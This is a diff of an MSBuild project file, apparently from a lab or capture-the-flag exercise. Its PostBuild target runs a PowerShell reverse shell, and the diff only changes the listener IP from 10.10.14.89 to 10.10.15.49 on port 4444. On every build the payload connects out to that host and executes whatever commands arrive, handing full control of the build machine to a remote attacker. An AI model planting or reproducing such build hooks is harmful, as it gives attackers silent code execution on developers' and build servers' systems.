@@ -26,7 +26,7 @@
   </ItemGroup>
 
   <Target Name="PostBuild" AfterTargets="PostBuildEvent">
-    <Exec Command="powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient('10.10.14.89',4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%25{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2&gt;&amp;1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '&gt; ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()&quot;&#xD;&#xA;" />
+    <Exec Command="powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient('10.10.15.49',4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%25{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2&gt;&amp;1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '&gt; ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()&quot;&#xD;&#xA;" />
   </Target>
 
 </Project>
